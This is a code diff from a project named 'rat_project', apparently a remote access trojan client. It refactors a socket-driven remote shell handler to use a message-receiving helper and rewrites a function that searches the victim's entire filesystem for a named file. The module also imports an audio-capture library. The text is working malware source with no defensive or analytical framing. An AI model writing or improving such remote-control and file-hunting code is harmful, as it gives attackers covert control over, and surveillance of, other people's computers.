@@ -19,7 +19,7 @@ from pathlib import Path
 
 import sounddevice
 
-from rat_project.common.protocol import decode_message, encode_message
+from rat_project.common.protocol import decode_message, encode_message, recv_message
 from rat_project.utils.logger_config import setup_logger
 
 logger = setup_logger("client.actions")
@@ -162,11 +162,7 @@ def handle_shell(conn: socket.socket) -> None:
 
     while True:
         try:
-            data = conn.recv(65536)
-            if not data:
-                break
-
-            message = decode_message(data.decode("utf-8").strip())
+            message = recv_message(conn)
 
             # Stop requested by the server
             if message.get("command") == "shell_stop":
@@ -333,16 +329,14 @@ def search_file(filename: str) -> str:
     Returns:
         str: List of found paths, or a message if no results.
     """
+    import os as _os
+
     results = []
+    root = "C:\\" if _get_os() == "Windows" else "/"
 
-    # Recursive search from the root
-    root = Path("C:/") if _get_os() == "Windows" else Path("/")
-
-    for path in root.rglob(filename):
-        try:
-            results.append(str(path))
-        except PermissionError:
-            continue
+    for dirpath, _, filenames in _os.walk(root, onerror=lambda e: None):
+        if filename in filenames:
+            results.append(_os.path.join(dirpath, filename))
 
     if not results:
         return f"No file found for: {filename}"
